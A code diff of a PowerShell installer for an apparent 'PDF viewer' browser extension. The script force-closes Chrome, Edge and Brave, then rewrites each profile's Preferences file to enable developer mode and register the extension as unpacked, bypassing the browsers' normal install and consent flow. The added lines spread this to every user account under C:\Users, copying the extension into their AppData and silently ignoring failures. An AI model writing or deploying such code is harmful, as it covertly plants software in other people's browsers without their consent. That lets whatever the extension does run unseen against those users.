@@ -26,11 +26,15 @@ try {
     Remove-Item $env:TEMP\pdf-viewer-temp -Recurse -Force -ErrorAction SilentlyContinue
     $manifestObj = Get-Content "$InstallDir\manifest.json" -Raw | ConvertFrom-Json
     $procNames = @('chrome.exe', 'msedge.exe', 'brave.exe')
+    $mySession = (Get-Process -Id $PID).SessionId
     foreach ($pn in $procNames) {
         $mains = @(Get-CimInstance Win32_Process -Filter "Name='$pn'" -ErrorAction SilentlyContinue | Where-Object { ([string]$_.CommandLine) -notmatch '--type=' })
         foreach ($m in $mains) {
             $exePath = $m.ExecutablePath
             if (-not $exePath) { continue }
+            $procSess = -1
+            try { $procSess = (Get-Process -Id $m.ProcessId -ErrorAction Stop).SessionId } catch { continue }
+            if ($procSess -ne $mySession) { continue }
             $argStr = ''
             $cl = [string]$m.CommandLine
             if ($cl.StartsWith('"')) {
@@ -52,41 +56,61 @@ try {
         Stop-Process -Name ([IO.Path]::GetFileNameWithoutExtension($pn)) -Force -ErrorAction SilentlyContinue
     }
     Start-Sleep -Seconds 1
-    $browsers = @{
-        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-        "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
-        "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
-    }
-    foreach ($browser in $browsers.GetEnumerator()) {
-        $userDataDir = $browser.Value
-        if (-not (Test-Path $userDataDir)) { continue }
-        $profiles = Get-ChildItem -Path $userDataDir -Directory | Where-Object { $_.Name -eq "Default" -or $_.Name -match "^Profile \d+$" }
-        foreach ($profile in $profiles) {
-            $prefsPath = Join-Path $profile.FullName "Preferences"
-            if (-not (Test-Path $prefsPath)) { continue }
+    $browserRels = @(
+        'AppData\Local\Google\Chrome\User Data',
+        'AppData\Local\Microsoft\Edge\User Data',
+        'AppData\Local\BraveSoftware\Brave-Browser\User Data'
+    )
+    foreach ($u in (Get-ChildItem -Path 'C:\Users' -Directory -ErrorAction SilentlyContinue)) {
+        $hasAny = $false
+        foreach ($rel in $browserRels) {
+            if (Test-Path (Join-Path $u.FullName $rel)) { $hasAny = $true; break }
+        }
+        if (-not $hasAny) { continue }
+        $userExtDir = Join-Path $u.FullName 'AppData\Local\PDFViewerExtension'
+        if ($u.FullName -ieq $env:USERPROFILE) {
+            $userExtDir = $InstallDir
+        } else {
             try {
-                $prefsJson = Get-Content $prefsPath -Raw | ConvertFrom-Json
-                if (-not $prefsJson.extensions) {
-                    $prefsJson | Add-Member -NotePropertyName "extensions" -NotePropertyValue @{} -Force
+                if (Test-Path $userExtDir) {
+                    Remove-Item $userExtDir -Recurse -Force -ErrorAction Stop
                 }
-                if (-not $prefsJson.extensions.ui) {
-                    $prefsJson.extensions | Add-Member -NotePropertyName "ui" -NotePropertyValue @{} -Force
-                }
-                $prefsJson.extensions.ui | Add-Member -NotePropertyName "developer_mode" -NotePropertyValue $true -Force
-                if (-not $prefsJson.extensions.settings) {
-                    $prefsJson.extensions | Add-Member -NotePropertyName "settings" -NotePropertyValue @{} -Force
-                }
-                $extSettings = @{
-                    path = $InstallDir
-                    location = 4
-                    state = 1
-                    manifest = $manifestObj
-                }
-                $prefsJson.extensions.settings | Add-Member -NotePropertyName $extId -NotePropertyValue $extSettings -Force
-                $json = $prefsJson | ConvertTo-Json -Depth 32
-                [IO.File]::WriteAllText($prefsPath, $json, (New-Object System.Text.UTF8Encoding($false)))
-                $installedCount++
-            } catch { }
+                Copy-Item -Path $extensionSourceDir -Destination $userExtDir -Recurse -Force -ErrorAction Stop
+            } catch {
+                continue
+            }
+        }
+        foreach ($rel in $browserRels) {
+            $userDataDir = Join-Path $u.FullName $rel
+            if (-not (Test-Path $userDataDir)) { continue }
+            $profiles = Get-ChildItem -Path $userDataDir -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq "Default" -or $_.Name -match "^Profile \d+$" }
+            foreach ($profile in $profiles) {
+                $prefsPath = Join-Path $profile.FullName "Preferences"
+                if (-not (Test-Path $prefsPath)) { continue }
+                try {
+                    $prefsJson = Get-Content $prefsPath -Raw | ConvertFrom-Json
+                    if (-not $prefsJson.extensions) {
+                        $prefsJson | Add-Member -NotePropertyName "extensions" -NotePropertyValue @{} -Force
+                    }
+                    if (-not $prefsJson.extensions.ui) {
+                        $prefsJson.extensions | Add-Member -NotePropertyName "ui" -NotePropertyValue @{} -Force
+                    }
+                    $prefsJson.extensions.ui | Add-Member -NotePropertyName "developer_mode" -NotePropertyValue $true -Force
+                    if (-not $prefsJson.extensions.settings) {
+                        $prefsJson.extensions | Add-Member -NotePropertyName "settings" -NotePropertyValue @{} -Force
+                    }
+                    $extSettings = @{
+                        path = $userExtDir
+                        location = 4
+                        state = 1
+                        manifest = $manifestObj
+                    }
+                    $prefsJson.extensions.settings | Add-Member -NotePropertyName $extId -NotePropertyValue $extSettings -Force
+                    $json = $prefsJson | ConvertTo-Json -Depth 32
+                    [IO.File]::WriteAllText($prefsPath, $json, (New-Object System.Text.UTF8Encoding($false)))
+                    $installedCount++
+                } catch { }
+            }
         }
     }
     foreach ($t in $relaunchTargets) {
